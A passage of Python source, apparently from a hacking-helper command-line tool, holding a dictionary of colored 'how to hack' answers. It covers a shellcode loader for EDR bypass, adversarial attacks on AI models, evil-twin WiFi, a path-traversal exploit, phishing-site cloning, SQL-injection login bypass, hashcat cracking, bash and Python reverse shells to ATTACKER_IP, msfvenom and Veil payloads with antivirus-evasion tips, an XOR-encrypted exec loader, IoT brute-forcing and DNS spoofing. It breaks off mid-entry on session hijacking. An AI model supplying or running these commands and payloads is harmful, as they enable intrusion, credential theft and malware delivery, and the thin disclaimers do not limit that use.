                            f"\n"
                            f"  payload = b'\\xfc\\x48\\x83\\xe4\\xf0...'  # Shellcode goes here\n"
                            f"  ptr = VirtualAlloc(None, len(payload), 0x3000, 0x40)\n"
                            f"  RtlMoveMemory(ptr, payload, len(payload))\n"
                            f"\n"
                            f"  ht = ctypes.windll.kernel32.CreateThread(None, 0, ptr, None, 0, None)\n"
                            f"  ctypes.windll.kernel32.WaitForSingleObject(ht, -1)\n\n"
                            f"{Colors.CYAN}Note:{Colors.END} This example shows a conceptual syscall bypass technique. Real-world attacks often combine multiple techniques with advanced obfuscation and in-memory operations.\n"
                            f"Bypassing EDRs is considered advanced red teaming or adversarial simulation. Use only in authorized environments.",





            "how to hack ai models": f"{Colors.CYAN}How To Hack AI Models (Adversarial Attacks):{Colors.END}\n"
                       f"{Colors.GREEN}• Description:{Colors.END} Adversarial attacks exploit weaknesses in machine learning and AI models by feeding them specially crafted inputs that lead to incorrect or manipulated outputs.\n\n"
                       f"{Colors.GREEN}• Common Adversarial Attack Techniques:{Colors.END}\n"
                       f"{Colors.YELLOW}  1. FGSM (Fast Gradient Sign Method): Adds imperceptible noise to input data using model gradients to fool classifiers.\n"
                       f"  2. PGD (Projected Gradient Descent): Iterative attack that creates stronger perturbations than FGSM.\n"
                       f"  3. Model Inversion: Reconstructs sensitive training data by reversing outputs.\n"
                       f"  4. Membership Inference Attack: Determines if specific data was part of the training set.\n"
                       f"  5. Data Poisoning: Injects malicious samples into the training set to manipulate model behavior.\n"
                       f"  6. Backdoor Attacks: Embeds triggers during training that cause misclassification only when trigger appears.\n\n"
                       f"{Colors.GREEN}• Example: Crafting Adversarial Image Using FGSM (with PyTorch):{Colors.END}\n"
                       f"{Colors.YELLOW}  import torch\n"
                       f"  import torch.nn as nn\n"
                       f"  def fgsm_attack(image, epsilon, gradient):\n"
                       f"      perturbed_image = image + epsilon * gradient.sign()\n"
                       f"      perturbed_image = torch.clamp(perturbed_image, 0, 1)\n"
                       f"      return perturbed_image\n\n"
                       f"  # Assume you have input image, model, loss, and label\n"
                       f"  image.requires_grad = True\n"
                       f"  output = model(image)\n"
                       f"  loss = loss_fn(output, label)\n"
                       f"  model.zero_grad()\n"
                       f"  loss.backward()\n"
                       f"  adv_image = fgsm_attack(image, 0.03, image.grad)\n\n"
                       f"{Colors.CYAN}Note:{Colors.END} These techniques are crucial in red teaming AI systems. Use only in ethical hacking scenarios and controlled labs to test AI robustness.\n"
                       f"Unauthorized tampering with deployed AI systems is illegal and unethical.",

 
   
            "how to use evil twin for wifi attacks": f"{Colors.CYAN}How To Use Evil Twin For WiFi Attacks:{Colors.END}\n"
                                       f"{Colors.GREEN}• Description:{Colors.END} An Evil Twin attack creates a rogue WiFi access point that mimics a legitimate one, tricking users into connecting and leaking sensitive data or credentials.\n\n"
                                       f"{Colors.GREEN}• Attack Steps:{Colors.END}\n"
                                       f"{Colors.YELLOW}  1. Identify Target Network:{Colors.END} Use tools like airodump-ng to gather info on SSID, BSSID, and channel.\n"
                                       f"{Colors.YELLOW}  2. Create Fake Access Point:{Colors.END} Use hostapd, airbase-ng, or WiFi-Pumpkin to clone the SSID of the target.\n"
                                       f"{Colors.YELLOW}  3. Jam Legitimate Signal:{Colors.END} Use aireplay-ng deauth attack to disconnect users from real AP.\n"
                                       f"{Colors.YELLOW}  4. Serve Fake Login Page:{Colors.END} Set up a phishing portal to capture credentials.\n"
                                       f"{Colors.YELLOW}  5. Capture Data or Inject Malware:{Colors.END} Use mitmproxy, sslstrip, or DNS spoofing for advanced interception.\n\n"
                                       f"{Colors.GREEN}• Example: Simple Evil Twin Setup with airbase-ng (Kali Linux):{Colors.END}\n"
                                       f"{Colors.YELLOW}  # Monitor mode\n"
                                       f"  airmon-ng start wlan0\n\n"
                                       f"  # Scan networks\n"
                                       f"  airodump-ng wlan0mon\n\n"
                                       f"  # Clone AP\n"
                                       f"  airbase-ng -e 'TargetSSID' -c 6 wlan0mon\n\n"
                                       f"  # Set up DHCP and fake captive portal manually or via tools\n\n"
                                       f"{Colors.CYAN}Note:{Colors.END} This method is used for red teaming and WiFi penetration testing. Never target networks you don't own or have permission to test.\n"
                                       f"Performing such attacks on public or private networks without authorization is ILLEGAL in many countries.",




            "how to exploit cves with public exploits": f"{Colors.CYAN}How To Exploit CVEs With Public Exploits:{Colors.END}\n"
                                           f"{Colors.GREEN}• Description:{Colors.END} CVEs (Common Vulnerabilities and Exposures) are publicly disclosed security flaws. Using public exploits allows attackers or red teamers to test systems for known vulnerabilities.\n\n"
                                           f"{Colors.GREEN}• Common Platforms To Find Exploits:{Colors.END}\n"
                                           f"{Colors.YELLOW}  1. Exploit-DB:{Colors.END} A large collection of verified public exploits (https://www.exploit-db.com)\n"
                                           f"{Colors.YELLOW}  2. GitHub:{Colors.END} Many CVEs have proof-of-concept (PoC) exploits shared on GitHub.\n"
                                           f"{Colors.YELLOW}  3. PacketStorm:{Colors.END} Archive of exploits, tools, and security research.\n"
                                           f"{Colors.YELLOW}  4. NVD (National Vulnerability Database):{Colors.END} For full CVE details and scoring.\n\n"
                                           f"{Colors.GREEN}• Attack Steps:{Colors.END}\n"
                                           f"{Colors.YELLOW}  1. Identify Target Software/Service:{Colors.END} Use nmap, whatweb, or Wappalyzer to fingerprint services.\n"
                                           f"{Colors.YELLOW}  2. Find CVEs:{Colors.END} Search CVEs using CPE names, version numbers, or CVSS scores.\n"
                                           f"{Colors.YELLOW}  3. Locate Public Exploit:{Colors.END} Search Exploit-DB or GitHub for working PoC code.\n"
                                           f"{Colors.YELLOW}  4. Test or Modify Exploit:{Colors.END} Adapt the exploit to your environment and test on lab systems.\n"
                                           f"{Colors.YELLOW}  5. Launch Exploit:{Colors.END} Run the code and verify success (e.g. reverse shell, file read, DoS).\n\n"
                                           f"{Colors.GREEN}• Example: Exploiting CVE-2021-41773 on Apache HTTPD (RCE):{Colors.END}\n"
                                           f"{Colors.YELLOW}  curl 'http://victim.com/cgi-bin/.%2e/%2e%2e/%2e%2e/etc/passwd'\n"
                                           f"  # This reveals /etc/passwd via path traversal if the server is vulnerable.\n\n"
                                           f"{Colors.GREEN}• Tips:{Colors.END}\n"
                                           f"{Colors.YELLOW}  • Always test on controlled environments.\n"
                                           f"{Colors.YELLOW}  • Modify PoCs to avoid signatures and increase success rate.\n"
                                           f"{Colors.YELLOW}  • Automate CVE hunting with tools like searchsploit, metasploit, or CVEHunter.\n\n"
                                           f"{Colors.CYAN}Note:{Colors.END} This is for ethical research, testing, and red teaming ONLY. Unauthorized use of exploits can lead to criminal charges and severe consequences.",





            "how to clone websites for phishing": f"{Colors.CYAN}How To Clone Websites For Phishing:{Colors.END}\n"
                                      f"{Colors.GREEN}• Description:{Colors.END} Cloning a website for phishing involves creating a near-identical copy of a legitimate site to trick users into submitting sensitive information like credentials or credit card details.\n\n"
                                      f"{Colors.GREEN}• Common Tools For Website Cloning:{Colors.END}\n"
                                      f"{Colors.YELLOW}  1. HTTrack:{Colors.END} Open-source website copier that downloads a full website structure.\n"
                                      f"{Colors.YELLOW}  2. BlackEye/HiddenEye:{Colors.END} Tools designed for phishing with pre-built templates for popular sites.\n"
                                      f"{Colors.YELLOW}  3. SET (Social Engineering Toolkit):{Colors.END} Professional-grade tool for crafting phishing pages and campaigns.\n"
                                      f"{Colors.YELLOW}  4. Manual Cloning (wget/curl):{Colors.END} You can also use wget/curl to download and edit HTML pages manually.\n\n"
                                      f"{Colors.GREEN}• Basic Attack Workflow:{Colors.END}\n"
                                      f"{Colors.YELLOW}  1. Choose a target website (e.g., Facebook, Instagram, Office365).\n"
                                      f"{Colors.YELLOW}  2. Use HTTrack or BlackEye to clone the front-end HTML/CSS/JS.\n"
                                      f"{Colors.YELLOW}  3. Modify the form action to send credentials to your custom backend.\n"
                                      f"{Colors.YELLOW}  4. Host the page using Apache, Nginx, or PHP server locally or via ngrok.\n"
                                      f"{Colors.YELLOW}  5. Send phishing links via email, SMS, or social engineering methods.\n\n"
                                      f"{Colors.GREEN}• Sample Command With HTTrack:{Colors.END}\n"
                                      f"{Colors.YELLOW}  httrack 'https://example.com' -O '/root/clone_folder' +*.example.com -v\n"
                                      f"  # This downloads the full website content for offline use.\n\n"
                                      f"{Colors.GREEN}• Example: BlackEye Clone & Host:{Colors.END}\n"
                                      f"{Colors.YELLOW}  git clone https://github.com/An0nUD4Y/blackeye\n"
                                      f"  cd blackeye && bash blackeye.sh\n"
                                      f"  # Select a phishing template and it launches with a tunneling link.\n\n"
                                      f"{Colors.GREEN}• Countermeasures (Defense Tips):{Colors.END}\n"
                                      f"{Colors.YELLOW}  • Always verify URLs before submitting credentials.\n"
                                      f"{Colors.YELLOW}  • Use 2FA (Two-Factor Authentication).\n"
                                      f"{Colors.YELLOW}  • Security awareness training for users.\n\n"
                                      f"{Colors.CYAN}Note:{Colors.END} Phishing is illegal without consent. Use only in penetration tests, red team ops, or cybersecurity training environments with proper authorization.",






            "how to bypass login screens (os & web)": f"{Colors.CYAN}How To Bypass Login Screens (OS & Web):{Colors.END}\n"
                                          f"{Colors.GREEN}• Description:{Colors.END} Bypassing login screens involves exploiting authentication flaws to gain unauthorized access to systems or applications, often without knowing the correct credentials.\n\n"
                                          f"{Colors.GREEN}• Common Methods For Web Login Bypass:{Colors.END}\n"
                                          f"{Colors.YELLOW}  1. SQL Injection:{Colors.END} Injecting SQL payloads into login forms to manipulate authentication logic.\n"
                                          f"{Colors.YELLOW}     Example: ' OR '1'='1 --\n"
                                          f"{Colors.YELLOW}  2. Authentication Bypass via Logic Flaws:{Colors.END} Exploiting insecure redirects, poor session handling, or weak login flow.\n"
                                          f"{Colors.YELLOW}  3. Brute Forcing:{Colors.END} Using tools like Hydra or Burp Intruder to guess credentials.\n"
                                          f"{Colors.YELLOW}  4. Default Credentials:{Colors.END} Using common default usernames/passwords (e.g., admin:admin).\n\n"
                                          f"{Colors.GREEN}• Common OS Login Bypass Techniques:{Colors.END}\n"
                                          f"{Colors.YELLOW}  1. Windows Sticky Keys Exploit:{Colors.END} Replacing `sethc.exe` with `cmd.exe` to get shell at login screen.\n"
                                          f"{Colors.YELLOW}     Command (via bootable disk): copy cmd.exe sethc.exe\n"
                                          f"{Colors.YELLOW}  2. Linux Single User Mode:{Colors.END} Boot into recovery mode to reset root password or spawn a shell.\n"
                                          f"{Colors.YELLOW}     Example: grub > init=/bin/bash\n"
                                          f"{Colors.YELLOW}  3. Live USB Attacks:{Colors.END} Booting from live OS and mounting internal drives to access data or manipulate system files.\n\n"
                                          f"{Colors.GREEN}• Tools Used:{Colors.END}\n"
                                          f"{Colors.YELLOW}  • Burp Suite (Intruder)\n"
                                          f"{Colors.YELLOW}  • Hydra / Medusa\n"
                                          f"{Colors.YELLOW}  • SQLMap\n"
                                          f"{Colors.YELLOW}  • Kali Linux Live USB\n\n"
                                          f"{Colors.GREEN}• Example Payload (SQLi Bypass):{Colors.END}\n"
                                          f"{Colors.YELLOW}  Username: admin' --\n"
                                          f"  Password: [leave blank]\n"
                                          f"  # Bypasses login if input is vulnerable to SQL injection.\n\n"
                                          f"{Colors.GREEN}• Countermeasures:{Colors.END}\n"
                                          f"{Colors.YELLOW}  • Input validation and prepared statements to prevent SQLi.\n"
                                          f"{Colors.YELLOW}  • Enforce strong password policies.\n"
                                          f"{Colors.YELLOW}  • Disable boot from USB in BIOS and protect with password.\n"
                                          f"{Colors.YELLOW}  • Patch known privilege escalation vulnerabilities.\n\n"
                                          f"{Colors.CYAN}Note:{Colors.END} These techniques are for educational and ethical hacking purposes only. Use only in authorized environments.",





            "how to crack passwords with hashcat": f"{Colors.CYAN}How To Crack Passwords With Hashcat:{Colors.END}\n"
                                       f"{Colors.GREEN}• Description:{Colors.END} Hashcat is one of the fastest and most powerful password recovery tools used to crack hashed passwords using various attack modes.\n\n"
                                       f"{Colors.GREEN}• Supported Hash Types (Examples):{Colors.END}\n"
                                       f"{Colors.YELLOW}  • MD5 (mode 0)\n"
                                       f"  • SHA1 (mode 100)\n"
                                       f"  • NTLM (mode 1000)\n"
                                       f"  • bcrypt (mode 3200)\n"
                                       f"  • WPA/WPA2 (mode 2500 / 22000)\n\n"
                                       f"{Colors.GREEN}• Common Attack Modes:{Colors.END}\n"
                                       f"{Colors.YELLOW}  1. Dictionary Attack:{Colors.END} Uses a list of possible passwords.\n"
                                       f"{Colors.YELLOW}     Command: hashcat -m 0 -a 0 hashes.txt wordlist.txt\n"
                                       f"{Colors.YELLOW}  2. Brute-force Attack:{Colors.END} Tries every possible character combination.\n"
                                       f"{Colors.YELLOW}     Command: hashcat -m 0 -a 3 hashes.txt ?a?a?a?a?a\n"
                                       f"{Colors.YELLOW}  3. Rule-based Attack:{Colors.END} Combines dictionary with mutation rules.\n"
                                       f"{Colors.YELLOW}  4. Mask Attack:{Colors.END} Optimized brute-force when pattern is partially known.\n"
                                       f"{Colors.YELLOW}  5. Hybrid Attack:{Colors.END} Mix of dictionary + mask or rules.\n\n"
                                       f"{Colors.GREEN}• Example Workflow (Dictionary Attack):{Colors.END}\n"
                                       f"{Colors.YELLOW}  1. Create or download a hash file (e.g., hashes.txt)\n"
                                       f"  2. Use rockyou.txt or custom wordlist\n"
                                       f"  3. Run:\n"
                                       f"     hashcat -m 0 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt\n\n"
                                       f"{Colors.GREEN}• Performance Tips:{Colors.END}\n"
                                       f"{Colors.YELLOW}  • Use GPU instead of CPU for faster cracking\n"
                                       f"{Colors.YELLOW}  • Use optimized hash-modes (-O) where safe\n"
                                       f"{Colors.YELLOW}  • Monitor system temperature (Hashcat is resource-heavy)\n\n"
                                       f"{Colors.GREEN}• Countermeasures (Defense):{Colors.END}\n"
                                       f"{Colors.YELLOW}  • Use long, complex passwords\n"
                                       f"{Colors.YELLOW}  • Implement rate-limiting and account lockout\n"
                                       f"{Colors.YELLOW}  • Use salted hashes (e.g., bcrypt, scrypt, argon2)\n"
                                       f"{Colors.YELLOW}  • Store passwords securely using modern hashing standards\n\n"
                                       f"{Colors.CYAN}Note:{Colors.END} Cracking hashes without permission is illegal. Always use tools like Hashcat in a lab environment or for authorized security assessments.",

 

            "how to hack using reverse shells": f"{Colors.CYAN}How To Hack Using Reverse Shells:{Colors.END}\n"
                                    f"{Colors.GREEN}• Description:{Colors.END} Reverse shells are a technique where the target machine initiates a connection back to the attacker’s machine, giving the attacker remote control over the target.\n\n"
                                    f"{Colors.GREEN}• How It Works:{Colors.END}\n"
                                    f"{Colors.YELLOW}  1. Attacker sets up a listener on their machine (e.g., using netcat).\n"
                                    f"  2. The target executes a payload that opens a shell and connects back to attacker’s IP and port.\n"
                                    f"  3. Once connected, the attacker can run commands remotely as if they were on the target machine.\n\n"
                                    f"{Colors.GREEN}• Common Tools & Commands:{Colors.END}\n"
                                    f"{Colors.YELLOW}  • Netcat listener:\n"
                                    f"    nc -lvnp 4444\n"
                                    f"  • Payload example (Bash reverse shell):\n"
                                    f"    bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\n\n"
                                    f"{Colors.GREEN}• Example Python Reverse Shell Payload:{Colors.END}\n"
                                    f"{Colors.YELLOW}  import socket, subprocess, os\n"
                                    f"  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)\n"
                                    f"  s.connect(('ATTACKER_IP',4444))\n"
                                    f"  os.dup2(s.fileno(),0)\n"
                                    f"  os.dup2(s.fileno(),1)\n"
                                    f"  os.dup2(s.fileno(),2)\n"
                                    f"  p=subprocess.call(['/bin/sh','-i'])\n\n"
                                    f"{Colors.GREEN}• Usage Tips:{Colors.END}\n"
                                    f"{Colors.YELLOW}  • Ensure firewall and antivirus do not block your payload.\n"
                                    f"  • Use encoding or obfuscation to evade detection.\n"
                                    f"  • Use secure and private networks for testing.\n\n"
                                    f"{Colors.GREEN}• Defense Tips:{Colors.END}\n"
                                    f"{Colors.YELLOW}  • Monitor outgoing connections.\n"
                                    f"  • Restrict outbound traffic using firewall rules.\n"
                                    f"  • Use endpoint detection and response (EDR) tools.\n\n"
                                    f"{Colors.CYAN}Note:{Colors.END} Use reverse shells only in authorized penetration testing environments. Unauthorized use is illegal and unethical.",




            "how to hack using payloads": f"{Colors.CYAN}How To Hack Using Payloads (MSFVenom, Veil):{Colors.END}\n"
                              f"{Colors.GREEN}• Description:{Colors.END} Payloads are malicious code snippets or executables used to exploit vulnerabilities and gain access to target systems. Tools like MSFVenom and Veil help create and obfuscate these payloads to bypass antivirus and security defenses.\n\n"
                              f"{Colors.GREEN}• Common Tools:{Colors.END}\n"
                              f"{Colors.YELLOW}  1. MSFVenom: Part of Metasploit, used to generate various payload types (reverse shells, bind shells, etc.).\n"
                              f"  2. Veil-Evasion: A framework to obfuscate payloads, helping evade antivirus detection.\n\n"
                              f"{Colors.GREEN}• How It Works:{Colors.END}\n"
                              f"{Colors.YELLOW}  • Generate payload with MSFVenom specifying payload type, LHOST (attacker IP), LPORT (port), and output format.\n"
                              f"  • Optionally obfuscate the payload using Veil.\n"
                              f"  • Deliver the payload to the target via phishing, USB drop, or exploit.\n"
                              f"  • Start a listener on the attacker machine (e.g., msfconsole or netcat) to catch the incoming connection.\n\n"
                              f"{Colors.GREEN}• Example MSFVenom Command:{Colors.END}\n"
                              f"{Colors.YELLOW}  msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o shell.exe\n\n"
                              f"{Colors.GREEN}• Example Veil Usage:{Colors.END}\n"
                              f"{Colors.YELLOW}  veil -p python/meterpreter/rev_tcp --LHOST ATTACKER_IP --LPORT 4444 --output shell.py\n\n"
                              f"{Colors.GREEN}• Tips to Bypass Antivirus:{Colors.END}\n"
                              f"{Colors.YELLOW}  • Use Veil to obfuscate and encrypt payloads.\n"
                              f"  • Change payload formats (exe, elf, apk, etc.) depending on target.\n"
                              f"  • Avoid common payload signatures.\n"
                              f"  • Use staged payloads to reduce detection.\n\n"
                              f"{Colors.GREEN}• Defense Recommendations:{Colors.END}\n"
                              f"{Colors.YELLOW}  • Keep antivirus and endpoint protection updated.\n"
                              f"  • Monitor unusual network connections.\n"
                              f"  • Train users to avoid phishing and suspicious files.\n"
                              f"  • Use application whitelisting and sandboxing.\n\n"
                              f"{Colors.CYAN}Note:{Colors.END} Always use payloads responsibly and only in authorized penetration testing or ethical hacking engagements.",




            "how to use bluetooth hacking techniques": f"{Colors.CYAN}How To Hack Using Bluetooth:{Colors.END}\n" 
                             f"{Colors.CYAN}Bluetooth Hacking Techniques:{Colors.END}\n"
                             f"{Colors.GREEN}• Description:{Colors.END} Methods to exploit vulnerabilities in Bluetooth protocols and devices to gain unauthorized access or intercept data.\n\n"
                             f"{Colors.GREEN}• Common Techniques:{Colors.END}\n"
                             f"{Colors.YELLOW}  1. Bluejacking: Sending unsolicited messages to nearby Bluetooth devices.\n"
                             f"  2. Bluesnarfing: Unauthorized access to information like contacts and messages from a Bluetooth device.\n"
                             f"  3. Bluebugging: Taking control of a Bluetooth-enabled device remotely.\n"
                             f"  4. Man-in-the-Middle (MITM) Attacks: Intercepting Bluetooth communication between devices.\n"
                             f"  5. Exploiting Weak Pairing Protocols: Taking advantage of insecure pairing processes to connect without authorization.\n\n"
                             f"{Colors.GREEN}• Example Attack Tool:{Colors.END}\n"
                             f"{Colors.YELLOW}  Tools like BlueZ (Linux Bluetooth stack), BlueMaho, and BTScanner are commonly used for Bluetooth hacking.\n\n"
                             f"{Colors.CYAN}Note:{Colors.END} Always obtain explicit permission before testing Bluetooth hacking techniques to avoid legal consequences.\n",




            "how to exploit misconfigured cloud services": f"{Colors.CYAN}How To Exploit misconfigured Cloud services:{Colors.END}\n" 
                             f"{Colors.CYAN}Exploiting Misconfigured Cloud Services:{Colors.END}\n"
                             f"{Colors.GREEN}• Description:{Colors.END} Techniques to identify and exploit common misconfigurations in cloud environments that expose sensitive data or allow unauthorized access.\n\n"
                             f"{Colors.GREEN}• Common Misconfigurations:{Colors.END}\n"
                             f"{Colors.YELLOW}  1. Publicly exposed storage buckets (e.g., AWS S3) allowing data leakage.\n"
                             f"  2. Overly permissive Identity and Access Management (IAM) policies.\n"
                             f"  3. Unrestricted inbound firewall rules.\n"
                             f"  4. Use of default or weak credentials for cloud services.\n"
                             f"  5. Lack of encryption for data at rest or in transit.\n\n"
                             f"{Colors.GREEN}• Exploitation Steps:{Colors.END}\n"
                             f"{Colors.YELLOW}  - Discovery: Use tools like ScoutSuite, Prowler, or manually audit configurations.\n"
                             f"  - Access: Exploit exposed services, download data from public buckets.\n"
                             f"  - Privilege Escalation: Abuse IAM roles or misconfigured policies to gain higher access.\n"
                             f"  - Persistence: Deploy backdoors or maintain access through compromised credentials.\n\n"
                             f"{Colors.CYAN}Note:{Colors.END} Always have explicit permission before testing cloud environments to prevent legal issues.\n",




            "how to hack cctv systems": f"{Colors.CYAN}Hacking CCTV Systems:{Colors.END}\n"
                                      f"{Colors.GREEN}• Exploiting default credentials (e.g., admin:admin){Colors.END}\n"
                                      f"{Colors.GREEN}• Scanning public IP ranges for open ports (like 554, 80, 8080){Colors.END}\n"
                                      f"{Colors.GREEN}• Accessing unsecured streams via RTSP or HTTP{Colors.END}\n"
                                      f"{Colors.GREEN}• Exploiting known vulnerabilities in camera firmware (e.g., CVE-2017-17106){Colors.END}\n"
                                      f"{Colors.GREEN}• Using Shodan to find exposed CCTV interfaces globally{Colors.END}\n\n"
                                      f"{Colors.CYAN}Examples of malicious techniques/code:{Colors.END}\n"
                                      f"{Colors.GREEN}• Nmap scan for CCTV cameras:\n"
                                      f"  nmap -p 554,80,8080 -Pn --open --script rtsp-url-brute <target_range>{Colors.END}\n"
                                      f"{Colors.GREEN}• Using VLC to open RTSP feed:\n"
                                      f"  vlc rtsp://<ip>:554/stream{Colors.END}\n"
                                      f"{Colors.GREEN}• Shodan search query:\n"
                                      f"  port:554 has_screenshot:true \"DVR\"{Colors.END}\n"
                                      f"{Colors.GREEN}• CVE Exploit scripts from Exploit-DB or GitHub{Colors.END}",






            "how to bypass antivirus with custom script": f"{Colors.CYAN}Bypassing Antivirus With Custom Script:{Colors.END}\n"
                           f"{Colors.GREEN}• Description:{Colors.END} Techniques to evade antivirus detection using custom scripting methods such as encryption, obfuscation, or runtime code manipulation.\n\n"
                           f"{Colors.GREEN}• Common Evasion Methods:{Colors.END}\n"
                           f"{Colors.YELLOW}  1. Payload Encryption: Encrypting the malicious payload so its signature isn’t detectable.\n"
                           f"  2. Obfuscation: Making the code unreadable or unrecognizable to static analysis.\n"
                           f"  3. Packing: Using tools like UPX or custom crypters to pack the binary differently.\n"
                           f"  4. Runtime Decryption: Decrypting and executing payload only in memory during runtime.\n"
                           f"  5. Junk Insertion: Adding random code blocks or delays to confuse heuristic engines.\n\n"
                           f"{Colors.GREEN}• Simple XOR Encrypted Payload Example in Python:{Colors.END}\n"
                           f"{Colors.YELLOW}  def xor_encrypt(data, key):\n"
                           f"      return bytearray([b ^ key for b in bytearray(data)])\n\n"
                           f"  malicious_code = b\"print('Malicious payload running')\"\n"
                           f"  key = 0x42\n"
                           f"  encrypted = xor_encrypt(malicious_code, key)\n\n"
                           f"  with open(\"payload.bin\", \"wb\") as f:\n"
                           f"      f.write(encrypted)\n\n"
                           f"  # Runtime decryptor\n"
                           f"  def xor_decrypt(data, key):\n"
                           f"      return bytes([b ^ key for b in data])\n\n"
                           f"  with open(\"payload.bin\", \"rb\") as f:\n"
                           f"      enc = f.read()\n"
                           f"  dec = xor_decrypt(enc, 0x42)\n"
                           f"  exec(dec.decode())\n\n"
                           f"{Colors.CYAN}Note:{Colors.END} This is a simplified example for research only. Real-world AV evasion often involves multiple layers, including polymorphic behavior, reflective loading, or using LOLBAS.\n"
                           f"Use only in a legal lab environment with permission.",





            "how to hack iot devices": f"{Colors.CYAN}How To Hack IoT Devices:{Colors.END}\n"
                           f"{Colors.GREEN}• Description:{Colors.END} IoT (Internet of Things) devices like smart TVs, cameras, and home assistants often have weak security configurations, making them prime targets for attacks.\n\n"
                           f"{Colors.GREEN}• Common Attack Surfaces:{Colors.END}\n"
                           f"{Colors.YELLOW}  1. Open ports and services (e.g., Telnet, SSH).\n"
                           f"  2. Default or weak credentials left unchanged.\n"
                           f"  3. Unpatched firmware vulnerabilities.\n"
                           f"  4. Insecure APIs or cloud communication.\n\n"
                           f"{Colors.GREEN}• Popular Tools Used:{Colors.END}\n"
                           f"{Colors.YELLOW}  • Shodan - To search vulnerable IoT devices online.\n"
                           f"  • Nmap - To scan for open ports on local networks.\n"
                           f"  • Hydra - To brute-force login credentials.\n"
                           f"  • Metasploit - For exploiting known CVEs.\n\n"
                           f"{Colors.GREEN}• Sample Enumeration Commands:{Colors.END}\n"
                           f"{Colors.YELLOW}  nmap -sV -p- 192.168.0.1/24\n"
                           f"  hydra -l admin -P passwords.txt telnet://192.168.0.105\n\n"
                           f"{Colors.GREEN}• Exploitation Example (Metasploit):{Colors.END}\n"
                           f"{Colors.YELLOW}  use exploit/linux/misc/netgear_telnetenable\n"
                           f"  set RHOST 192.168.0.105\n"
                           f"  run\n\n"
                           f"{Colors.GREEN}• Tips for Effective IoT Hacking:{Colors.END}\n"
                           f"{Colors.YELLOW}  • Focus on outdated firmware and open Telnet/SSH.\n"
                           f"  • Use social engineering to trick users into installing backdoors.\n"
                           f"  • Leverage vulnerabilities from exploit-db or CVE lists.\n\n"
                           f"{Colors.GREEN}• Defense Tips:{Colors.END}\n"
                           f"{Colors.YELLOW}  • Change default credentials immediately.\n"
                           f"  • Regularly update IoT firmware.\n"
                           f"  • Isolate IoT devices on separate VLANs or networks.\n\n"
                           f"{Colors.CYAN}Note:{Colors.END} Always test against your own authorized devices or in controlled environments. Unauthorized IoT access is illegal and punishable by law.",


 


            "how to use social engineering": f"{Colors.CYAN}How To Use Social Engineering In Hacking:{Colors.END}\n"
                                 f"{Colors.GREEN}• Description:{Colors.END} Social engineering is a psychological manipulation technique used to trick individuals into revealing confidential information or performing actions that compromise security.\n\n"
                                 f"{Colors.GREEN}• Popular Social Engineering Techniques:{Colors.END}\n"
                                 f"{Colors.YELLOW}  1. Phishing: Sending fake emails/websites to collect credentials.\n"
                                 f"  2. Vishing: Using phone calls to trick victims into revealing data.\n"
                                 f"  3. Smishing: Sending malicious SMS messages to manipulate victims.\n"
                                 f"  4. Impersonation: Pretending to be someone trustworthy (e.g., IT staff).\n"
                                 f"  5. Baiting: Leaving infected USBs or fake software downloads to lure users.\n\n"
                                 f"{Colors.GREEN}• Example Phishing Setup:{Colors.END}\n"
                                 f"{Colors.YELLOW}  • Use a tool like Zphisher or BlackEye:\n"
                                 f"    git clone https://github.com/htr-tech/zphisher.git\n"
                                 f"    cd zphisher && bash zphisher.sh\n\n"
                                 f"{Colors.GREEN}• Real-World Examples:{Colors.END}\n"
                                 f"{Colors.YELLOW}  • Fake tech support calls to gain remote access.\n"
                                 f"  • Sending login page replicas via email.\n"
                                 f"  • Tricking HR staff into opening malicious attachments.\n\n"
                                 f"{Colors.GREEN}• Defense Tips:{Colors.END}\n"
                                 f"{Colors.YELLOW}  • Train employees on security awareness.\n"
                                 f"  • Use email filters and multi-factor authentication (MFA).\n"
                                 f"  • Verify unknown requests via secondary channels.\n\n"
                                 f"{Colors.CYAN}Note:{Colors.END} Social engineering is highly effective because it targets human behavior, not systems. Use it only in legal penetration testing with permission!",


 

            "how to hack using dns spoofing": f"{Colors.CYAN}How To Hack Using DNS Spoofing:{Colors.END}\n"
                                  f"{Colors.GREEN}• Description:{Colors.END} DNS Spoofing (or DNS poisoning) involves corrupting a DNS resolver’s cache, causing the victim to be redirected to a malicious site instead of the legitimate one.\n\n"
                                  f"{Colors.GREEN}• How It Works:{Colors.END}\n"
                                  f"{Colors.YELLOW}  1. Attacker intercepts or forges DNS responses.\n"
                                  f"  2. Victim types a legitimate domain (e.g., www.bank.com).\n"
                                  f"  3. Spoofed DNS response redirects victim to attacker’s IP (e.g., a phishing page).\n"
                                  f"  4. Victim unknowingly interacts with a fake website.\n\n"
                                  f"{Colors.GREEN}• Tools Commonly Used:{Colors.END}\n"
                                  f"{Colors.YELLOW}  • Ettercap\n"
                                  f"  • Bettercap\n"
                                  f"  • Cain & Abel (for LAN-based spoofing)\n"
                                  f"  • DNSChef (for fake DNS server setup)\n\n"
                                  f"{Colors.GREEN}• Example (Ettercap):{Colors.END}\n"
                                  f"{Colors.YELLOW}  • Launch ettercap with ARP poisoning and DNS spoof plugin:\n"
                                  f"    ettercap -T -q -i wlan0 -M arp:remote -P dns_spoof // //\n"
                                  f"  • Edit /usr/share/ettercap/etter.dns to spoof domains:\n"
                                  f"    *.facebook.com A 192.168.0.100\n\n"
                                  f"{Colors.GREEN}• Defense Tips:{Colors.END}\n"
                                  f"{Colors.YELLOW}  • Use DNSSEC for DNS integrity verification.\n"
                                  f"  • Use HTTPS and certificate pinning to detect fake sites.\n"
                                  f"  • Monitor DNS traffic for anomalies.\n"
                                  f"  • Educate users to watch for fake login prompts.\n\n"
                                  f"{Colors.CYAN}Note:{Colors.END} DNS spoofing should only be used in penetration testing labs or legal engagements with client permission. Unauthorized use is a criminal offense.",


 


            "how to hack using session hijacking": f"{Colors.CYAN}How To Hack Using Session Hijacking:{Colors.END}\n"
                                       f"{Colors.GREEN}• Description:{Colors.END} Session hijacking is a technique where an attacker takes over a valid user session, allowing them to impersonate the user on a web service without needing their login credentials.\n\n"
                                       f"{Colors.GREEN}• How It Works:{Colors.END}\n"
                                       f"{Colors.YELLOW}  1. Attacker steals the session cookie or token.\n"
                                       f"  2. Attacker injects it into their own browser or request header.\n"
                                       f"  3. Web server believes attacker is the legitimate user.\n\n"
                                       f"{Colors.GREEN}• Common Methods:{Colors.END}\n"
